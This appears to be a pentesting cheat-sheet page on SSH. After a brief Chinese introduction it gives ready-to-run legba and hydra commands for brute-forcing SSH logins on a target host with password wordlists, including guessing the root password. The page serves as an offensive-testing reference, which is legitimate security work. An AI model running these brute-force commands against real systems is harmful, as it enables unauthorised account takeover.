# SSH

<details>

<summary>Introduction</summary>

SSH（Secure Shell Protocol）是一种加密的网络协议，用于安全地在两台计算机之间进行远程登录和数据传输。它提供了加密的通信会话，使得用户可以在不安全的网络中安全地管理远程设备和执行命令。SSH广泛应用于远程服务器管理、文件传输和安全通信等领域。

</details>

<table><thead><tr><th width="178">Name</th><th>SSH (Secure Shell Protocol)</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>22</td></tr><tr><td><strong>RCE</strong></td><td>Feasible</td></tr><tr><td><strong>Vulnerability</strong></td><td>Brute Force</td></tr></tbody></table>

## Brute Force

If the SSH service has been authenticated, you can use tools like [legba](https://github.com/evilsocket/legba) and [hydra](https://github.com/vanhauser-thc/thc-hydra) for brute force.

{% code title="Environment" %}
```bash
HOST=; PORT=22; # TARGET HOST INFO
DICT_PATH=~/hack/dicts/hack-dict; # LOCAL DICT PATH
```
{% endcode %}

{% code title="Use Legba" %}
```bash
docker run \
  -v $DICT_PATH:/hack-dict \
  -v $(PWD):/out \
  --network host -it --rm \
  evilsocket/legba:latest \
  ssh --target $HOST:$PORT \
  --username /hack-dict/username/top10.txt \
  --password /hack-dict/darkweb2017-top100.txt \
  -O /out/legba-ssh-outptu.txt
```
{% endcode %}

{% code title="Reference Docs" %}
```
https://github.com/evilsocket/legba
https://github.com/evilsocket/legba/wiki/Installation-and-Building
https://github.com/evilsocket/legba/wiki/Usage-and-Main-Options
https://github.com/evilsocket/legba/wiki/SSH-and-SFTP
```
{% endcode %}

{% code title="Use Hydra" %}
```bash
hydra -l root -P $DICT_PATH/test-10.txt -t 4 ssh://$HOST:$PORT
```
{% endcode %}

{% code title="Reference Docs" %}
```
https://github.com/vanhauser-thc/thc-hydra
```
{% endcode %}
